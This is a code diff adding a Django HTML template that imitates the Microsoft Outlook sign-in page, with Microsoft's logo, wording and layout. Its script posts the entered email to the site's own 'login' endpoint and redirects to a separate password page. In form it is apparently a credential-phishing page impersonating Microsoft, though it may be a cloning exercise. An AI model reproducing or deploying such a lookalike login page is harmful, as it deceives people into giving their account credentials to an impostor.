@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom right, #f2e7f7, #e1f5fe);
+        }
+
+        h1 {
+            font-size: 50px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            color: #333;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            gap: 20px;
+        }
+
+        .sign-in-box {
+            background-color: #fff;
+            padding: 40px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 100%;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 24px;
+            margin-right: 8px;
+        }
+
+        .microsoft-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: left;
+            color: #333;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            border: none;
+            border-bottom: 1px solid blue;
+        }
+
+        .input-field1 {
+            margin-bottom: 10px;
+            padding: 10px;
+            font-size: 14px;
+            width: 160px;
+            font-size: 14px;
+            border: none;
+            border-bottom: 1px solid blue;
+        }
+
+        .next-btn {
+            width: 120px;
+            padding: 8px 16px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #005a9e;
+            ;
+            border: none;
+            cursor: pointer;
+            float: right;
+        }
+
+        .next-btn:hover {
+            background-color: #0078d4;
+        }
+
+        /* 
+.stepback{
+    font-size: 30px;
+}
+
+.stepback:hover{
+    background-color: #d1c0c0;
+    border-radius: 50%;
+    border: 1px solid black;
+    text-decoration: none;
+} */
+        .back {
+            display: flex;
+            /* Use flexbox to align items in a row */
+            align-items: center;
+            /* Center items vertically */
+        }
+
+        .stepback {
+            font-size: 30px;
+            margin-right: 10px;
+            /* Add some space between the link and email */
+        }
+
+        .stepback:hover {
+            background-color: #d1c0c0;
+            border-radius: 50%;
+            border: 1px solid black;
+            text-decoration: none;
+            /* Removes underline on hover */
+        }
+
+        .email {
+            margin: 0;
+            /* Remove default margin from paragraph */
+        }
+
+        .sign-in-options {
+            display: flex;
+            align-items: center;
+            /* Center align the items vertically */
+            padding: 10px 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 100%;
+        }
+
+        .sign-in-options img {
+            margin-left: 30px;
+            margin-right: 15px;
+            /* Space between the key icon and the button */
+            width: 30px;
+            height: 30px;
+        }
+
+        .sign-in-options button {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: none;
+            border: none;
+            font-size: 16px;
+            color: black;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .sign-in-options button:hover {
+            color: #005a9e;
+        }
+
+        a {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+        .error_message {
+            margin-top: 20px;
+            color: green; /* You can change the color to suit your design */
+        }
+    </style>
+
+
+
+</head>
+
+<body>
+    <h1> Outlook</h1>
+    <div class="container">
+        <div class="sign-in-box">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
+                <span class="microsoft-text">Microsoft</span>
+            </div>
+            <h2>Sign in</h2>
+            <p style="margin-bottom: 20px; font-size: small;">to continue to Outlook</p>
+            <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required class="input-field">
+            <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}">
+            <p><a href="#"><span style="color: black;">No account?</span> Create one!</a></p><br>
+            <button class="next-btn" onclick="handleEmailSubmit()">Next</button>
+            <div style="margin-left: 45px;" id="error_message" class="error_message"></div>  <!-- Message placeholder -->
+        </div>
+        <div class="sign-in-options">
+            <img src="https://img.icons8.com/?size=32&id=23204&format=png" alt="key">
+            <button> Sign-in options</button>
+        </div>
+    </div>
+
+    <script>
+        async function handleEmailSubmit() {
+            console.log("handleEmailSubmit triggered");  // Debugging line
+            const email = document.getElementById("emailInput").value;
+            const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;
+
+            // Clear any previous error messages
+            document.getElementById("error_message").innerText = '';
+
+            if (email) {
+                const response = await fetch("{% url 'login' %}", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-CSRFToken": csrfToken
+                    },
+                    body: JSON.stringify({ email }),
+                });
+
+                const data = await response.json();
+
+                if (data.redirect) {
+                    // Only redirect if there is no error message
+                    window.location.href = data.redirect;  // Redirect to the password page
+                } else {
+                    // Display the error message
+                    document.getElementById("error_message").innerText = data.error || "Email Already Exists";
+                    document.getElementById("error_message").style.color = "red"; // Set error message color
+                }
+            } else {
+                document.getElementById("error_message").innerText = "Please enter an email address.";
+                document.getElementById("error_message").style.color = "red"; // Set error message color
+            }
+        }
+    </script>
+</body>
